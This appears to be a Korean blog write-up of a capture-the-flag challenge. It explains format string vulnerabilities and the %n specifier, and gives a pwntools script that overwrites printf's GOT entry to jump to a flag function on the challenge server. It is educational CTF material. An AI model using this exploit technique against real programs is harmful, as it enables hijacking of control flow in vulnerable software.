## 사전지식  
FSB가 뭘 까요?   
FSB - 포맷스트링 버그 취약점의 줄임말.   
```
int main(int argc,char *argv[])
{
  char buf[256];
  strncpy(buf,argv[1],sizeof(buf));
  printf(buf);
}
```   
이런식으로 포맷스트링을 지정하지 않을 시 FSB취약점을 이용해 임의의 악성코드도 실행할 수 있다.
포맷스트링 = 형식지정자. 우리가 아는 %d, %c ...    
이 중 우리가 모르는 %n라는 포맷스트링 지정자가 있는데, 
```   
char buf[] = "abcde";
printf("%s %n\n",buf,&n);
```    
이 지정자는 출력한 문자열의 개수를 특정 메모리에 써주는 역할을 한다.   
다시 위 코드로 가서, 여기서 문제는 바로 c언어에 포맷스트링 문자를 넣었을 경우 발생하는데,   
음 해보면 알거다.   
쨋든 printf()함수는 포맷스트링 문자를 만나면 스택에 저장된 값을 하나씩 뽑아서 출력해준다.   
ret, ebp, buf...그냥 스택에 있는 값을 접근해 출력할 수 있다.   
그리고 가장 중요한건 만약   
```
printf("ccddeedfads..%x%x%x%n",&n)
``` 
이렇게 된다면 n의 주소에는 여태까지 출력한 문자열의 개수를 덮어쓸 수 있다.   
원하는 개수로 주소를 변조해 들어갈 수 있다는 뜻.   
이걸로 우리가 
## 풀이    
문제에서 FSB를 쓰라고 되어있으니 한번 체크헤보자.   
는 개 쌉소리고 ida로 보면 위 형식처럼 snprintf()/printf()에 포맷스트링문자를 지정하지 않은 채 받는 걸 볼 수 있다.   

```
BBBB %p %p %p %p    
```  
> BBBB (nil) 0x42424242 0x20702520 0x25207025       
자 보면 두 번째 포맷스트링에서 우리가 입력한 BBBB를 주소로 바꾼 값을 포인팅 한다는게 보이지 않는가?    
즉 BBBB는 0x42424242라는 주소가 되고, 그 주소에 %n으로 만들어진 값이 채워지는 것을 알 수 있다.   
예시를 들자면 BBBB %x %n를 했을 때, 4+1(공백)+4(%x)+1 = 10이 %n의 위치, 여기서는 0x42424242에 들어간다.   
다시 ida로 돌아가면 flag함수가 눈에 보인다. 그러면 이 flag함수를 실행하기 위해서 
다른 라이트업을 보면 뭔 printf@got를 overwrite하라는데 우리 늅늅이들은 이딴 소리가 뭔지 모를 것이다.   
간-단하게 설명하자면, 함수 호출 시 plt와 got이 있는데, 우리가 함수를 호출하는 것은 정확히 함수의 plt를 호출하는 것이고,   
이때 got으로 jmp하게 된다. 그럼 got에는 뭐가 있느냐?   
바로 함수의 원래 주소가 들어가 있는 것이다. 이유를 설명하면 길어지니 링크를 달아놓겠다.   
<https://bpsecblog.wordpress.com/2016/03/07/about_got_plt_1/>   
그럼 printf()함수를 더블클릭해 got주소를 알아냈으니, 이제 파이썬 코드를 짜보자!    

```   
from pwn import *

r = remote('ctf.j0n9hyun.xyz',3002)
flag = 0x080485B4
decflag = '%'+str(int(flag)-4)+'x'+'%n'
print_got = 0x804A00c
p = p32(print_got)
p+=decflag
r.sendline(p)
r.interactive()
```   
자 코드 해석 간다!!     
일단 위의 내용을 잘 읽었다면 %n는 출력한 문자열의 개수를 특정메모리에 쓴다고 배웠다.   
일단 printf@got의 주소를 입력해주고 flag주소값의 크기-4만큼 출력하도록 할꺼다.   
그래서 나는 flag주소를 int로 바꾸고 -4, 즉 printf@got의 주소의 크기만큼 빼준값의 크기를 %x사이에 넣고,   
%n을 통해서 printf@got주소에 값을 넣으면 printf()가 실행 될때 flag가 실행 될 것이다.   
DUT!!!!!!!!!     





